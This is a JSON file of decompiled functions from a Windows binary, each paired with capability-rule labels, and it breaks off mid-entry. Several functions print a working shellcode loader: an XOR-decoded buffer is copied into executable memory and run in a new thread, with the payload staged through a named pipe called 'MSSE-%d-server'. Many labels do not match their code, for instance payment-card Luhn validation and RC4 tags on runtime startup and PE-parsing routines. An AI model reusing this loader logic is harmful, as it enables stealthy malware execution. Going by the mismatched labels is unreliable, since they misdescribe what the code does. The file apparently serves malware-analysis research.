{
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00401180(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint64_t uVar3;\n    bool bVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    ulong *puVar13;\n    int64_t in_GS_OFFSET;\n    bool bVar14;\n    ulong auStack152 [7];\n    uint8_t uStack92;\n    uint16_t uStack88;\n    \n    puVar13 = auStack152;\n    for (iVar12 = 0xd; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    if (*0x408070 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack152);\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_Sleep;\n    uVar11 = *(*(in_GS_OFFSET + 0x30) + 8);\n    LOCK();\n    bVar14 = *0x408a08 == 0;\n    *0x408a08 = *0x408a08 ^ bVar14 * (*0x408a08 ^ uVar11);\n    uVar3 = !bVar14 * *0x408a08;\n    bVar14 = false;\n    if ((uVar3 == 0) || (bVar14 = true,  uVar11 == uVar3)) {\ncode_r0x00401204:\n        bVar4 = bVar14;\n        if (*0x408a00 != 1) goto code_r0x00401213;\ncode_r0x00401434:\n        sub.msvcrt.dll__amsg_exit(0x1f);\n        bVar4 = bVar14;\n    }\n    else {\n        do {\n            (*pcVar8)(1000);\n            LOCK();\n            bVar14 = *0x408a08 == 0;\n            *0x408a08 = *0x408a08 ^ bVar14 * (*0x408a08 ^ uVar11);\n            uVar3 = !bVar14 * *0x408a08;\n            if (uVar3 == 0) {\n                bVar14 = false;\n                goto code_r0x00401204;\n            }\n        } while (uVar11 != uVar3);\n        bVar14 = true;\n        bVar4 = true;\n        if (*0x408a00 == 1) goto code_r0x00401434;\ncode_r0x00401213:\n        if (*0x408a00 == 0) {\n            *0x408a00 = 1;\n            sub.msvcrt.dll__initterm(0x40a018, 0x40a030);\n        }\n        else {\n            *0x408000 = 1;\n        }\n    }\n    if (*0x408a00 == 1) {\n        sub.msvcrt.dll__initterm(0x40a000, 0x40a010);\n        *0x408a00 = 2;\n    }\n    if (!bVar4) {\n        LOCK();\n        *0x408a08 = 0;\n    }\n    if (*0x404400 != NULL) {\n        (**0x404400)(0, 2);\n    }\n    fcn.00402270();\n    *0x4080a0 = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0x401c60);\n    fcn.00401b50();\n    fcn.004028a0();\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (pcVar8 != NULL) {\n        (*pcVar8)();\n    }\n    fcn.00402970();\n    iVar5 = *0x408004;\n    if (*0x408070 != 0) {\n        bVar14 = false;\n        *0x408990 = *_sym.imp.msvcrt.dll__acmdln;\n        do {\n            cVar2 = **0x408990;\n            if (cVar2 < '!') {\n                if (cVar2 == '\\0') goto code_r0x004012f4;\n                if (!bVar14) goto code_r0x004012e8;\n            }\n            else if (cVar2 == '\\\"') {\n                bVar14 = bVar14 ^ 1;\n            }\n            *0x408990 = *0x408990 + 1;\n        } while( true );\n    }\ncode_r0x0040131f:\n    iVar9 = sub.msvcrt.dll_malloc(*0x408004 + 1 << 3);\n    iVar6 = *0x408008;\n    iVar12 = 0;\n    if (0 < iVar5) {\n        iVar12 = 0;\n        do {\n            iVar7 = sub.msvcrt.dll_strlen(*(iVar6 + iVar12 * 8));\n            uVar10 = sub.msvcrt.dll_malloc(iVar7 + 1);\n            *(iVar9 + iVar12 * 8) = uVar10;\n            iVar1 = iVar12 * 8;\n            iVar12 = iVar12 + 1;\n            sub.msvcrt.dll_memcpy(uVar10, *(iVar6 + iVar1), iVar7 + 1);\n        } while (iVar12 < iVar5);\n        iVar12 = iVar5 * 8;\n    }\n    *(iVar9 + iVar12) = 0;\n    *0x408008 = iVar9;\n    fcn.00402a20();\n    iVar5 = *0x408004;\n    *_sym.imp.msvcrt.dll___initenv = *0x408010;\n    uVar11 = fcn.00403060(iVar5, *0x408008);\n    *0x408018 = uVar11;\n    if (*0x40801c != 0) {\n        if (*0x408000 == 0) {\n            sub.msvcrt.dll__cexit();\n            uVar11 = *0x408018;\n        }\n        return uVar11;\n    }\n    sub.msvcrt.dll_exit(uVar11 & 0xffffffff);\n    *0x408070 = 1;\n    fcn.00402a40();\n    uVar11 = fcn.00401180();\n    return uVar11;\n    while (**0x408990 != '\\0') {\ncode_r0x004012e8:\n        *0x408990 = *0x408990 + 1;\n        if (' ' < **0x408990) break;\n    }\ncode_r0x004012f4:\n    *0x408998 = 10;\n    *0x4089a0 = 0x400000;\n    if ((uStack92 & 1) != 0) {\n        *0x408998 = uStack88;\n    }\n    goto code_r0x0040131f;\n}\n",
        "token_count": 1539
    },
    "00402a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00402a20(void)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    if (*0x408380 != 0) {\n        return *0x408380;\n    }\n    *0x408380 = 1;\n    uVar4 = *0x403090 & 0xffffffff;\n    if (*0x403090 == -1) {\n        uVar1 = 0;\n        do {\n            uVar4 = uVar1;\n            uVar3 = uVar4 + 1;\n            uVar1 = uVar3;\n        } while (*(uVar3 * 8 + 0x403090) != 0);\n    }\n    uVar3 = uVar4;\n    while (uVar3 != 0) {\n        (**(uVar4 * 8 + 0x403090))();\n        uVar3 = uVar4 - 1;\n        uVar4 = uVar3;\n    }\n    iVar2 = fcn.004018e0(0x402980);\n    return -(iVar2 == 0);\n}\n",
        "token_count": 256
    },
    "00402270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004022ed)\n// WARNING: Removing unreachable block (ram,0x004022f7)\n// WARNING: Removing unreachable block (ram,0x00402301)\n// WARNING: Removing unreachable block (ram,0x004023c8)\n// WARNING: Removing unreachable block (ram,0x004023d4)\n// WARNING: Removing unreachable block (ram,0x004023e0)\n// WARNING: Removing unreachable block (ram,0x004023ec)\n// WARNING: Removing unreachable block (ram,0x004023f9)\n// WARNING: Removing unreachable block (ram,0x00402405)\n// WARNING: Removing unreachable block (ram,0x00402412)\n// WARNING: Removing unreachable block (ram,0x00402423)\n// WARNING: Removing unreachable block (ram,0x00402496)\n// WARNING: Removing unreachable block (ram,0x004024a3)\n// WARNING: Removing unreachable block (ram,0x0040243e)\n// WARNING: Removing unreachable block (ram,0x00402440)\n// WARNING: Removing unreachable block (ram,0x00402519)\n// WARNING: Removing unreachable block (ram,0x00402523)\n// WARNING: Removing unreachable block (ram,0x00402449)\n// WARNING: Removing unreachable block (ram,0x00402461)\n// WARNING: Removing unreachable block (ram,0x004024ec)\n// WARNING: Removing unreachable block (ram,0x004024c5)\n// WARNING: Removing unreachable block (ram,0x004024d4)\n// WARNING: Removing unreachable block (ram,0x00402536)\n// WARNING: Removing unreachable block (ram,0x0040253b)\n// WARNING: Removing unreachable block (ram,0x00402544)\n// WARNING: Removing unreachable block (ram,0x004024d6)\n// WARNING: Removing unreachable block (ram,0x004024db)\n// WARNING: Removing unreachable block (ram,0x004024b4)\n// WARNING: Removing unreachable block (ram,0x004024f8)\n// WARNING: Removing unreachable block (ram,0x00402505)\n// WARNING: Removing unreachable block (ram,0x0040246a)\n// WARNING: Removing unreachable block (ram,0x0040246f)\n// WARNING: Removing unreachable block (ram,0x00402479)\n// WARNING: Removing unreachable block (ram,0x00402488)\n// WARNING: Removing unreachable block (ram,0x00402491)\n// WARNING: Removing unreachable block (ram,0x00402311)\n// WARNING: Removing unreachable block (ram,0x0040231a)\n// WARNING: Removing unreachable block (ram,0x00402321)\n// WARNING: Removing unreachable block (ram,0x00402346)\n// WARNING: Removing unreachable block (ram,0x00402354)\n// WARNING: Removing unreachable block (ram,0x00402383)\n// WARNING: Removing unreachable block (ram,0x00402393)\n// WARNING: Removing unreachable block (ram,0x00402549)\n// WARNING: Removing unreachable block (ram,0x00402567)\n// WARNING: Removing unreachable block (ram,0x00402590)\n// WARNING: Removing unreachable block (ram,0x0040259f)\n// WARNING: Removing unreachable block (ram,0x00402589)\n// WARNING: Removing unreachable block (ram,0x004023ad)\n// WARNING: Removing unreachable block (ram,0x00402370)\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n\nulong fcn.00402270(ulong param_1)\n\n{\n    ulong in_RAX;\n    int64_t iVar1;\n    uchar auStack104 [24];\n    ulong var_48h;\n    ulong var_30h;\n    ulong var_bp_20h;\n    \n    if (*0x408350 == 0) {\n        *0x408350 = 1;\n        fcn.004026e0();\n        iVar1 = fcn.00402e40(param_1);\n        *0x408360 = 0;\n        *0x408358 = auStack104 + -iVar1;\n        in_RAX = 0;\n    }\n    return in_RAX;\n}\n",
        "token_count": 916
    },
    "00402da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00402da0(ulong noname_0, ulong arg2)\n\n{\n    if (arg2 != 1) {\n        if (arg2 == 0) {\n            if (*0x408920 != 0) {\n                fcn.00402c10();\n            }\n            if (*0x408920 == 1) {\n                *0x408920 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x408940);\n            }\n        }\n        else if ((arg2 == 3) && (*0x408920 != 0)) {\n            fcn.00402c10();\n        }\n        return 1;\n    }\n    if (*0x408920 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x408940);\n    }\n    *0x408920 = 1;\n    return 1;\n}\n",
        "token_count": 194
    },
    "004018e0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.004018e0(ulong arg1)\n\n{\n    ulong uVar1;\n    int64_t iStack24;\n    ulong uStack16;\n    \n    iStack24 = fcn.004018c0(*0x4089f0);\n    if (iStack24 != -1) {\n        sub.msvcrt.dll__lock(8);\n        iStack24 = fcn.004018c0(*0x4089f0);\n        uStack16 = fcn.004018c0(*0x4089f8);\n        uVar1 = sub.msvcrt.dll___dllonexit(arg1, &iStack24, &uStack16);\n        *0x4089f0 = fcn.004018d0(iStack24);\n        *0x4089f8 = fcn.004018d0(uStack16);\n        sub.msvcrt.dll__unlock(8);\n        return uVar1;\n    }\n    uVar1 = (*_sym.imp.msvcrt.dll__onexit)(arg1);\n    return uVar1;\n}\n",
        "token_count": 231
    },
    "004028a0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004028a0(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint64_t arg1;\n    \n    if (*0x408370 == 0) {\n        arg1 = 0;\n        while( true ) {\n            pcVar2 = fcn.00402810(arg1);\n            if (pcVar2 == NULL) break;\n            if ((((*pcVar2 == 'M') || (*pcVar2 == 'm')) && ((pcVar2[1] == 'S' || (pcVar2[1] == 's')))) &&\n               ((((pcVar2[2] == 'V' || (pcVar2[2] == 'v')) && ((pcVar2[3] == 'C' || (pcVar2[3] == 'c')))) &&\n                (((pcVar2[4] == 'R' || (pcVar2[4] == 'r')) &&\n                 ((cVar1 = pcVar2[5],  cVar1 == 'T' || ((cVar1 == 't' || (cVar1 - 0x30U < 10)))))))))) {\n                *0x408370 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(pcVar2);\n                if (*0x408370 != 0) {\n                    return;\n                }\n                break;\n            }\n            arg1 = arg1 + 1;\n        }\n        *0x408370 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"msvcrt.dll\");\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "004014f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.004014f3(int64_t arg1, ulong dwSize, int64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uchar auStack44 [4];\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n    for (iVar2 = 0; iVar2 < dwSize; iVar2 = iVar2 + 1) {\n        *(iVar1 + iVar2) = *(arg3 + (iVar2 & 3)) ^ *(arg1 + iVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(iVar1, dwSize, 0x20, auStack44);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x4014f0, iVar1, 0, 0);\n    return;\n}\n",
        "token_count": 200
    },
    "00401590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401590(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t in_stack_ffffffffffffffa8;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateNamedPipeA)\n                      (0x4089b0, 2, 0, 1, in_stack_ffffffffffffffa8 & 0xffffffff00000000, 0, 0, 0);\n    if ((iVar3 - 1U < 0xfffffffffffffffe) &&\n       (iVar2 = (*_sym.imp.KERNEL32.dll_ConnectNamedPipe)(iVar3, 0),  pcVar1 = _sym.imp.KERNEL32.dll_WriteFile, \n       iVar2 != 0)) {\n        while ((0 < arg2 && (iVar2 = (*pcVar1)(iVar3, arg1, arg2, auStack44, 0),  iVar2 != 0))) {\n            arg2._0_4_ = arg2 - auStack44[0];\n            arg1 = arg1 + auStack44[0];\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return;\n}\n",
        "token_count": 293
    },
    "00401662": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00401662(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x4089b0, 0x80000000, 3, 0, 3, 0x80, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_ReadFile;\n    uVar4 = 0;\n    if (iVar3 != -1) {\n        while ((0 < arg2 && (iVar2 = (*pcVar1)(iVar3, arg1, arg2, auStack44, 0),  iVar2 != 0))) {\n            arg2._0_4_ = arg2 - auStack44[0];\n            arg1 = arg1 + auStack44[0];\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 254
    },
    "00401755": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00401755(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong arg1;\n    uint64_t uVar3;\n    uint uVar4;\n    ulong in_stack_ffffffffffffffc0;\n    uint32_t uVar5;\n    ulong in_stack_fffffffffffffff0;\n    \n    uVar5 = in_stack_fffffffffffffff0 >> 0x20;\n    uVar4 = in_stack_ffffffffffffffc0 >> 0x20;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    sub.msvcrt.dll_sprintf\n              (0x4089b0, \"%c%c%c%c%c%c%c%c%cMSSE-%d-server\", 0x5c, 0x5c, 0x2e, CONCAT44(uVar4, 0x5c), 0x70, 0x69, 0x70, \n               0x65, 0x5c, (uVar3 & 0xffffffff) % 0x26aa | uVar5 << 0x20);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x401645, 0, 0, 0);\n    arg1 = sub.msvcrt.dll_malloc(*0x404004);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar1)(0x400);\n        iVar2 = fcn.00401662(arg1, *0x404004);\n    } while (iVar2 == 0);\n    fcn.004014f3(arg1, *0x404004, 0x404008);\n    return 0;\n}\n",
        "token_count": 374
    },
    "00401b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401b50(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t *piVar6;\n    ulong *puVar7;\n    uint64_t uVar8;\n    \n    iVar4 = fcn.00402790();\n    iVar3 = *0x4080a8;\n    if ((iVar4 != 0) && (*0x4080a8 == 0)) {\n        *0x4080a8 = 1;\n        iVar5 = fcn.00402600(\".pdata\");\n        iVar3 = 1;\n        if (iVar5 == 0) {\n            piVar6 = 0x4080c0;\n            puVar7 = 0x4080c0;\n            for (iVar5 = 0x30; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar7 = 0x408240;\n            for (iVar5 = 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            uVar8 = 0;\n            do {\n                iVar5 = fcn.00402710(uVar8);\n                if (iVar5 == 0) {\n                    if (uVar8 == 0) {\n                        return 1;\n                    }\n                    uVar8 = uVar8 & 0xffffffff;\n                    goto code_r0x00401c35;\n                }\n                *(uVar8 * 8 + 0x408240) = 9;\n                *(uVar8 * 8 + 0x408244) = 0x4019b0 - iVar4;\n                iVar3 = *(iVar5 + 0xc);\n                *piVar6 = iVar3;\n                iVar1 = *(iVar5 + 8);\n                iVar2 = uVar8;\n                uVar8 = uVar8 + 1;\n                piVar6[2] = (iVar2 * 8 + 0x408240) - iVar4;\n                piVar6[1] = iVar3 + iVar1;\n                piVar6 = piVar6 + 3;\n            } while (uVar8 != 0x20);\n            uVar8 = 0x20;\ncode_r0x00401c35:\n            (*_sym.imp.KERNEL32.dll_RtlAddFunctionTable)(0x4080c0, uVar8, iVar4);\n            iVar3 = 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 604
    },
    "00402020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004022ed)\n// WARNING: Removing unreachable block (ram,0x004022f7)\n// WARNING: Removing unreachable block (ram,0x00402301)\n// WARNING: Removing unreachable block (ram,0x004023c8)\n// WARNING: Removing unreachable block (ram,0x004023d4)\n// WARNING: Removing unreachable block (ram,0x004023e0)\n// WARNING: Removing unreachable block (ram,0x004023ec)\n// WARNING: Removing unreachable block (ram,0x004023f9)\n// WARNING: Removing unreachable block (ram,0x00402405)\n// WARNING: Removing unreachable block (ram,0x00402412)\n// WARNING: Removing unreachable block (ram,0x00402423)\n// WARNING: Removing unreachable block (ram,0x00402496)\n// WARNING: Removing unreachable block (ram,0x004024a3)\n// WARNING: Removing unreachable block (ram,0x0040243e)\n// WARNING: Removing unreachable block (ram,0x00402440)\n// WARNING: Removing unreachable block (ram,0x00402519)\n// WARNING: Removing unreachable block (ram,0x00402523)\n// WARNING: Removing unreachable block (ram,0x00402449)\n// WARNING: Removing unreachable block (ram,0x00402461)\n// WARNING: Removing unreachable block (ram,0x004024ec)\n// WARNING: Removing unreachable block (ram,0x004024c5)\n// WARNING: Removing unreachable block (ram,0x004024d4)\n// WARNING: Removing unreachable block (ram,0x00402536)\n// WARNING: Removing unreachable block (ram,0x0040253b)\n// WARNING: Removing unreachable block (ram,0x00402544)\n// WARNING: Removing unreachable block (ram,0x004024d6)\n// WARNING: Removing unreachable block (ram,0x004024db)\n// WARNING: Removing unreachable block (ram,0x004024b4)\n// WARNING: Removing unreachable block (ram,0x004024f8)\n// WARNING: Removing unreachable block (ram,0x00402505)\n// WARNING: Removing unreachable block (ram,0x0040246a)\n// WARNING: Removing unreachable block (ram,0x0040246f)\n// WARNING: Removing unreachable block (ram,0x00402479)\n// WARNING: Removing unreachable block (ram,0x00402488)\n// WARNING: Removing unreachable block (ram,0x00402491)\n// WARNING: Removing unreachable block (ram,0x00402311)\n// WARNING: Removing unreachable block (ram,0x0040231a)\n// WARNING: Removing unreachable block (ram,0x00402321)\n// WARNING: Removing unreachable block (ram,0x00402346)\n// WARNING: Removing unreachable block (ram,0x00402354)\n// WARNING: Removing unreachable block (ram,0x00402383)\n// WARNING: Removing unreachable block (ram,0x00402393)\n// WARNING: Removing unreachable block (ram,0x00402549)\n// WARNING: Removing unreachable block (ram,0x00402567)\n// WARNING: Removing unreachable block (ram,0x00402590)\n// WARNING: Removing unreachable block (ram,0x0040259f)\n// WARNING: Removing unreachable block (ram,0x00402589)\n// WARNING: Removing unreachable block (ram,0x004023ad)\n// WARNING: Removing unreachable block (ram,0x00402370)\n\nuint64_t fcn.00402020(uint64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t in_RAX;\n    uchar *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    char *arg1_00;\n    uint32_t uVar6;\n    code *pcVar7;\n    uint *puVar8;\n    code *pcVar9;\n    ulong arg3_00;\n    uchar *in_R9;\n    int64_t unaff_R12;\n    int64_t unaff_R13;\n    uchar auStack304 [64];\n    uint64_t uStack240;\n    uint64_t uStack232;\n    ulong uStack224;\n    int64_t iStack216;\n    code *pcStack208;\n    ulong uStack168;\n    ulong uStack144;\n    uint32_t uStack132;\n    ulong uStack120;\n    int32_t iStack84;\n    uint uStack60;\n    \n    if (arg3 == 0) {\n        return in_RAX;\n    }\n    uVar5 = arg3;\n    if (*0x408360 < 1) {\n        pcVar7 = NULL;\n    }\n    else {\n        pcVar7 = NULL;\n        puVar3 = *0x408358;\n        do {\n            if ((*(puVar3 + 8) <= arg1) &&\n               (uVar5 = *(*(puVar3 + 0x10) + 8),  pcVar9 = _sym.imp.KERNEL32.dll_VirtualQuery, \n               arg1 < *(puVar3 + 8) + uVar5)) goto code_r0x00402117;\n            uVar6 = pcVar7 + 1;\n            pcVar7 = uVar6;\n            puVar3 = puVar3 + 0x18;\n        } while (uVar6 != *0x408360);\n    }\n    pcStack208 = 0x4020a0;\n    unaff_R12 = fcn.004026a0(arg1);\n    if (unaff_R12 == 0) {\n        pcStack208 = 0x40223d;\n        fcn.00401fb0(\"Address %p has no image-section\", arg1, uVar5, in_R9);\n    }\n    else {\n        unaff_R13 = pcVar7 * 0x18;\n        puVar8 = *0x408358 + unaff_R13;\n        *(puVar8 + 4) = unaff_R12;\n        *puVar8 = 0;\n        pcStack208 = 0x4020d2;\n        iVar4 = fcn.00402790();\n        *(puVar8 + 2) = iVar4 + *(unaff_R12 + 0xc);\n        pcVar7 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        pcStack208 = 0x4020fe;\n        iVar4 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(*(*0x408358 + unaff_R13 + 8), &stack0xffffffffffffff88, 0x30);\n        if (iVar4 != 0) {\n            if ((iStack84 == 4) || (iStack84 == 0x40)) {\ncode_r0x00402110:\n                *0x408360 = *0x408360 + 1;\n                pcVar9 = pcVar7;\n            }\n            else {\n                arg3_00 = 0x40;\n                in_R9 = *0x408358 + unaff_R13;\n                pcStack208 = 0x402185;\n                iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(uStack120);\n                if (iVar2 != 0) goto code_r0x00402110;\n                pcStack208 = 0x40218f;\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcStack208 = 0x40219d;\n                fcn.00401fb0(\"  VirtualProtect failed with code 0x%x\", uVar6, arg3_00, in_R9);\n                pcVar9 = _sym.imp.KERNEL32.dll_VirtualQuery;\n            }\ncode_r0x00402117:\n            pcStack208 = 0x402127;\n            iVar4 = (*pcVar9)(arg1, &stack0xffffffffffffff58, 0x30);\n            pcVar1 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            pcVar7 = pcVar9;\n            if (iVar4 != 0) {\n                if ((uStack132 == 4) || (uStack132 == 0x40)) {\n    // WARNING: Could not recover jumptable at 0x00402e98. Too many branches\n    // WARNING: Treating indirect jump as call\n                    uVar5 = (*_sym.imp.msvcrt.dll_memcpy)(arg1, arg2, arg3);\n                    return uVar5;\n                }\n                pcStack208 = 0x4021d6;\n                (*_sym.imp.KERNEL32.dll_VirtualProtect)(uStack168, uStack144, 0x40, &stack0xffffffffffffffc4);\n                pcStack208 = 0x4021e4;\n                sub.msvcrt.dll_memcpy(arg1, arg2, arg3);\n                if ((uStack132 != 0x40) && (uStack132 != 4)) {\n                    pcStack208 = 0x402216;\n                    uVar5 = (*pcVar1)(uStack168, uStack144, uStack60, &stack0xffffffffffffffc4);\n                    return uVar5;\n                }\n                return uStack132;\n            }\n            goto code_r0x0040225a;\n        }\n    }\n    pcStack208 = 0x40225a;\n    fcn.00401fb0(\"  VirtualQuery failed for %d bytes at address %p\", *(unaff_R12 + 8), *(*0x408358 + unaff_R13 + 8), \n                 in_R9);\ncode_r0x0040225a:\n    arg1_00 = \"  VirtualQuery failed for %d bytes at address %p\";\n    pcStack208 = 0x40226e;\n    uVar5 = fcn.00401fb0(\"  VirtualQuery failed for %d bytes at address %p\", 0x30, arg1, in_R9);\n    if (*0x408350 == 0) {\n        *0x408350 = 1;\n        uStack240 = arg1;\n        uStack232 = arg3;\n        uStack224 = arg2;\n        iStack216 = unaff_R12;\n        pcStack208 = pcVar7;\n        fcn.004026e0();\n        iVar4 = fcn.00402e40(arg1_00);\n        *0x408360 = 0;\n        *0x408358 = &stack0xfffffffffffffed0 + -iVar4;\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 2289
    },
    "00402580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00402580(int16_t *arg1)\n\n{\n    if ((*arg1 == 0x5a4d) && (*(arg1 + *(arg1 + 0x1e)) == 0x4550)) {\n        return *(arg1 + *(arg1 + 0x1e) + 6) == 0x20b;\n    }\n    return false;\n}\n",
        "token_count": 87
    },
    "004025b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.004025b0(int64_t arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    arg1 = arg1 + *(arg1 + 0x3c);\n    if (*(arg1 + 6) != 0) {\n        iVar2 = arg1 + 0x18 + *(arg1 + 0x14);\n        iVar1 = iVar2 + 0x28;\n        do {\n            if ((*(iVar2 + 0xc) <= arg2) && (arg2 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 0x28;\n        } while (iVar2 != iVar1 + (*(arg1 + 6) - 1) * 0x28);\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "00402600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
